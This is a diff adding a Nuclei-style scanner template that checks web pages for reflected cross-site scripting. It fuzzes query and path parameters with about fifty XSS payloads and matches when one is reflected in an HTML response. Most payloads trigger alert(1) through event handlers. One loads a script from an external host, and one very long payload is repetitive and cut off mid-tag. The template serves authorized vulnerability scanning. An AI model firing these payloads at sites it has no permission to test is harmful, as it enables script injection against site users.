@@ -1,0 +1,98 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></noscript>"
+        - "<code oncopy=\"alert(1)\" contenteditable>test</code><input id=x type=number contenteditable>test</input><output id=y type=number contenteditable>test</output><form id=f></form><input id=i name=a contenteditable>test</input><input id=j type=text contenteditable>test</input><input id=k type=email contenteditable>test</input><textarea id=l id=1 contenteditable>test</textarea><textarea id=m contenteditable>test</textarea><input id=n id=2 contenteditable>test</input><input id=o type=file contenteditable>test</input><input id=p id=3 type=color contenteditable>test</input><fieldset onfocusout=alert(1) id=q contenteditable>test</fieldset><progress id=r contenteditable>test</progress><legend id=s contenteditable>test</legend><button onbeforepaste=\"alert(1)\" contenteditable>test</button><table id=t id=4 type=color contenteditable>test</table><input id=u name=a contenteditable>test</input><select id=v id=5 contenteditable>test</select><optgroup id=w id=6 type=color contenteditable>test</optgroup><option id=x id=7 contenteditable>test</option><input id=y id=8 type=file contenteditable>test</input><input id=z id=9 onbeforepaste=\"alert(1)\" contenteditable>test</input><output id=_ id=10 type=color contenteditable>test</output><input id=a id=11 name=a contenteditable>test</input><input id=b id=12 contenteditable>test</input><input id=c id=13 type=text contenteditable>test</input><textarea id=d id=14 contenteditable>test</textarea><table id=e id=15 contenteditable>test</table><thead id=f id=16 type=color contenteditable>test</thead><tbody id=g id=17 contenteditable>test</tbody><tfoot id=h id=18 contenteditable>test</tfoot><th id=i id=19 type=color contenteditable>test</th><td id=j id=20 contenteditable>test</td><input id=k id=21 name=a contenteditable>test</input><input id=l id=22 contenteditable>test</input><input id=m id=23 type=text contenteditable>test</input><textarea id=n id=24 contenteditable>test</textarea><table id=o id=25 contenteditable>test</table><thead id=p id=26 type=color contenteditable>test</thead><tbody id=q id=27 contenteditable>test</tbody><tfoot id=r id=28 contenteditable>test</tfoot><th id=s id=29 type=color contenteditable>test</th><td id=t id=30 contenteditable>test</td><input id=u id=31 name=a contenteditable>test</input><input id=v id=32 contenteditable>test</input><input id=w id=33 type=text contenteditable>test</input><textarea id=x id=34 contenteditable>test</textarea><table id=y id=35 contenteditable>test</table><thead id=z id=36 type=color contenteditable>test</thead><tbody id=_ id=37 contenteditable>test</tbody><tfoot id=a id=38 contenteditable>test</tfoot><th id=b id=39 type=color contenteditable>test</th><td id=c id=40 contenteditable>test</td><input id=d id=41 name=a contenteditable>test</input><input id=e id=42 contenteditable>test</input><input id=f id=43 type=text contenteditable>test</input><textarea id=g id=44 contenteditable>test</textarea><table id=h id=45 contenteditable>test</table><thead id=i id=46 type=color contenteditable>test</thead><tbody id=j id=47 contenteditable>test</tbody><tfoot id=k id=48 contenteditable>test</tfoot><th id=l id=49 type=color contenteditable>test</th><td id=m id=50 contenteditable>test</td><input id=n id=51 name=a contenteditable>test</input><input id=o id=52 contenteditable>test</input><input id=p id=53 type=text contenteditable>test</input><textarea id=q id=54 contenteditable>test</textarea><table id=r id=55 contenteditable>test</table><thead id=s id=56 type=color contenteditable>test</thead><tbody id=t id=57 contenteditable>test</tbody><tfoot id=u id=58 contenteditable>test</tfoot><th id=v id=59 type=color contenteditable>test</th><td id=w id=60 contenteditable>test</td><input id=x id=61 name=a contenteditable>test</input><input id=y id=62 contenteditable>test</input><input id=z id=63 type=text contenteditable>test</input><textarea id=_ id=64 contenteditable>test</textarea><table id=a id=65 contenteditable>test</table><thead id=b id=66 type=color contenteditable>test</thead><tbody id=c id=67 contenteditable>test</tbody><tfoot id=d id=68 contenteditable>test</tfoot><th id=e id=69 type=color contenteditable>test</th><td id=f id=70 contenteditable>test</td><input id=g id=71 name=a contenteditable>test</input><input id=h id=72 contenteditable>test</input><input id=i id=73 type=text contenteditable>test</input><textarea id=j id=74 contenteditable>test</textarea><table id=k id=75 contenteditable>test</table><thead id=l id=76 type=color contenteditable>test</thead><tbody id=m id=77 contenteditable>test</tbody><tfoot id=n id=78 contenteditable>test</tfoot><th id=o id=79 type=color contenteditable>test</th><td id=p id=80 contenteditable>test</td><input id=q id=81 name=a contenteditable>test</input><input id=r id=82 contenteditable>test</input><input id=s id=83 type=text contenteditable>test</input><textarea id=t id=84 contenteditable>test</textarea><table id=u id=85 contenteditable>test</table><thead id=v id=86 type=color contenteditable>test</thead><tbody id=w id=87 contenteditable>test</tbody><tfoot id=x id=88 contenteditable>test</tfoot><th id=y id=89 type=color contenteditable>test</th><td id=z id=90 contenteditable>test</td><input id=_ id=91 name=a contenteditable>test</input><input id=a id=92 contenteditable>test</input><input id=b id=93 type=text contenteditable>test</input><textarea id=c id=94 contenteditable>test</textarea><table id=d id=95 contenteditable>test</table><thead id=e id=96 type=color contenteditable>test</thead><tbody id=f id=97 contenteditable>test</tbody><tfoot id=g id=98 contenteditable>test</tfoot><th id=h id=99 type=color contenteditable>test</th><td id=i id=100 contenteditable>test</td><input id=j id=101 name=a contenteditable>test</input><input id=k id=102 contenteditable>test</input><input id=l id=103 type=text contenteditable>test</input><textarea id=m id=104 contenteditable>test</textarea><table id=n id=105 contenteditable>test</table><thead id=o id=106 type=color contenteditable>test</thead><tbody id=p id=107 contenteditable>test</tbody><tfoot id=q id=108 contenteditable>test</tfoot><th id=r id=109 type=color contenteditable>test</th><td id=s id=110 contenteditable>test</td><input id=t id=111 name=a contenteditable>test</input><input id=u id=112 contenteditable>test</input><input id=v id=113 type=text contenteditable>test</input><textarea id=w id=114 contenteditable>test</textarea><table id=x id=115 contenteditable>test</table><thead id=y id=116 type=color contenteditable>test</thead><tbody id=z id=117 contenteditable>test</tbody><tfoot id=_ id=118 contenteditable>test</tfoot><th id=a id=119 type=color contenteditable>test</th><td id=b id=120 contenteditable>test</td><input id=c id=121 name=a contenteditable>test</input><input id=d id=122 contenteditable>test</input><input id=e id=123 type=text contenteditable>test</input><textarea id=f id=124 contenteditable>test</textarea><table id=g id=125 contenteditable>test</table><thead id=h id=126 type=color contenteditable>test</thead><tbody id=i id=127 contenteditable>test</tbody><tfoot id=j id=128 contenteditable>test</tfoot><th id=k id=129 type=color contenteditable>test</th><td id=l id=130 contenteditable>test</td><input id=m id=131 name=a contenteditable>test</input><input id=n id=132 contenteditable>test</input><input id=o id=133 type=text contenteditable>test</input><textarea id=p id=134 contenteditable>test</textarea><table id=q id=135 contenteditable>test</table><thead id=r id=136 type=color contenteditable>test</thead><tbody id=s id=137 contenteditable>test</tbody><tfoot id=t id=138 contenteditable>test</tfoot><th id=u id=139 type=color contenteditable>test</th><td id=v id=140 contenteditable>test</td><input id=w id=141 name=a contenteditable>test</input><input id=x id=142 contenteditable>test</input><input id=y id=143 type=text contenteditable>test</input><textarea id=z id=144 contenteditable>test</textarea><table id=_ id=145 contenteditable>test</table><thead id=a id=146 type=color contenteditable>test</thead><tbody id=b id=147 contenteditable>test</tbody><tfoot id=c id=148 contenteditable>test</tfoot><th id=d id=149 type=color contenteditable>test</th><td id=e id=150 contenteditable>test</td><input id=f id=151 name=a contenteditable>test</input><input id=g id=152 contenteditable>test</input><input id=h id=153 type=text contenteditable>test</input><textarea id=i id=154 contenteditable>test</textarea><table id=j id=155 contenteditable>test</table><thead id=k id=156 type=color contenteditable>test</thead><tbody id=l id=157 contenteditable>test</tbody><tfoot id=m id=158 contenteditable>test</tfoot><th id=n id=159 type=color contenteditable>test</th><td id=o id=160 contenteditable>test</td><input id=p id=161 name=a contenteditable>test</input><input id=q id=162 contenteditable>test</input><input id=r id=163 type=text contenteditable>test</input><textarea id=s id=164 contenteditable>test</textarea><table id=t id=165 contenteditable>test</table><thead id=u id=166 type=color contenteditable>test</thead><tbody id=v id=167 contenteditable>test</tbody><tfoot id=w id=168 contenteditable>test</tfoot><th id=x id=169 type=color contenteditable>test</th><td id=y id=170 contenteditable>test</td><input id=z id=171 name=a contenteditable>test</input><input id_ id=172 contenteditable>test</input><input id=a id=173 type=text contenteditable>test</input><textarea id=b id=174 contenteditable>test</textarea><table id=c id=175 contenteditable>test</table><thead id=d id=176 type=color contenteditable>test</thead><tbody id=e id=177 contenteditable>test</tbody><tfoot id=f id=178 contenteditable>test</tfoot><th id=g id=179 type=color contenteditable>test</th><td id=h id=180 contenteditable>test</td><input id=i id=181 name=a contenteditable>test</input><input id=j id=182 contenteditable>test</input><input id=k id=183 type=text contenteditable>test</input><textarea id=l id=184 contenteditable>test</textarea><table id=m id=185 contenteditable>test</table><thead id=o id=186 type=color contenteditable>test</thead><tbody id=p id=187 contenteditable>test</tbody><tfoot id=q id=188 contenteditable>test</tfoot><th id=r id=189 type=color contenteditable>test</th><td id=s id=190 contenteditable>test</td><input id=t id=191 name=a contenteditable>test</input><input id=u id=192 contenteditable>test</input><input id=v id=193 type=text contenteditable>test</input><textarea id=w id=194 contenteditable>test</textarea><table id=x id=195 contenteditable>test</table><thead id=y id=196 type=color contenteditable>test</thead><tbody id=z id=197 contenteditable>test</tbody><tfoot id=_ id=198 contenteditable>test</tfoot><th id=a id=199 type=color contenteditable>test</th><td id=b id=200 contenteditable>test</td><input id=c id=201 name=a contenteditable>test</input><input id=d id=202 contenteditable>test</input><input id=e id=203 type=text contenteditable>test</input><textarea id=f id=204 contenteditable>test</textarea><table id=g"
+        - "<frame onmousemove=\"alert(1)\">test</frame><p id=x style=\"position:absolute;\" onmousemove=alert(1)></p><div id=y style=\"position:absolute;\" onmousemove=alert(1)></div><script onmousemove=alert(1)></script><body onload=javascript:alert(1)>test</body>"
+        - "<payloadbox style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\" />"
+        - "<em style=\"font-size:expression(10px+15px+2x+3px*0)\">20px</em>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><track id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></track>"
+        - "<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr><script id=y defer=defer>alert(\"test\")</script>"
+        - "<base href=\"http://example.com/\">
+<body onload=\"javascript:alert(1)\">
+<div id=x tabindex=1 onbeforeactivate=alert(1)></div><input type=text contenteditable>"
+        - "<fieldset id=x tabindex=1 onfocusout=\"alert(1)\" contenteditable>test</fieldset>"
+        - "<details id=notificaties onmouseup=\"alert(1)\">test</details><input id=x tabindex=1 onbeforeactivate=alert(1)>test"
+        - "<kbd oncopy=\"alert(1)\" contenteditable>test</kbd>"
+        - "<style>:target {transform: rotate(180deg);}</style><input id=x style=\"transition:transform 1s\" ontransitionrun=alert(1)>"
+        - "<video src=\"x\" onerror=\"alert(1)\"></video>"
+        - "<style>@keyframes slidein {}</style><script style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></script>"
+        - "<style>:target {transform: rotate(180deg);}</style><img id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<style>:target {transform: rotate(180deg);}</style><noscript id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></noscript>"
+        - "<frame src=x onerror=javascript:alert(1)>"
+        - "<frame src=\"javascript:alert(1)\">"
+        - "<sup oncontextmenu=\"alert(1)\">test</sup>"
+        - "<form onfocusout=alert(1)></form>"
+        - "<pre><script type=\"text/javascript\">javascript:alert(1)</script></pre>"
+        - "<input id=x tabindex=1 onfocusin=alert(1)></input><input id=y autofocus></input>"
+        - "<svg><rect onmouseup=alert&#x1(1)\\'\\'>test</rect></svg>"
+        - "<menuitem draggable=\"true\" ondragend=\"alert(1)\">test</menuitem>"
+        - "<html id=x tabindex=1 onfocusout=alert(1)></html><input autofocus>"
+        - "<template id=x tabindex=1 onbeforeactivate=alert(1)></template>"
+        - "<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>"
+        - "<details onmouseup=\"alert(1)\">test</details>"
+        - "<style>:target {transform: rotate(180deg);}</style><tr id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></tr>"
+        - "<script>alert(1)</script>"
+        - "<basefont style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">test</basefont>"
+        - "<q oncut=\"alert(1)\">test</q>"
+        - "<style>:target {transform: rotate(180deg);}</style><frame id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></frame>"
+        - "<menuitem draggable=\"true\" ondragleave=\"alert(1)\">test</menuitem>"
+        - "<menuitem id=x tabindex=1 ontouchstart=alert(1)></menuitem><input id=y autofocus>"
+        - "<input onfocus=alert(1) tabindex=1 id=x></input><a href=#x autofocus></a>"
+        - "<IMG SRC=\"javascript:javascript:alert(String.fromCharCode(88,83,83))\">"
+        - "<em onclick=alert(1)></em>"
+        - "<script src=\"http://ha.ckers.org/xss.js\"></script>"
+        - "<script onload=alert(1)>test</script><input src=x\\x11onerror=javascript:alert(1) />"
+        - "<html><script>alert(1);</script></html>"
+        - "<video onmousedown=\"alert(1)\">test</video>"
+        - "<style>:target {transform: rotate(180deg);}</style><slot id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></slot>"
+        - "<picture draggable=\"true\" ondragstart=\"alert(1)\">test</picture>"
+        - "<style>@keyframes x{}</style><canvas style=\"animation-name:x\" onanimationstart=\"alert(1)\"></canvas>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)>"
+        - "<script>alert('XSS');</script>"
+        - "<style>:target {transform: rotate(180deg);}</style><link id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></link>"
+        - "<p><p><a href=\"http://www.example.com\">clickme</a>"
+        - "<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
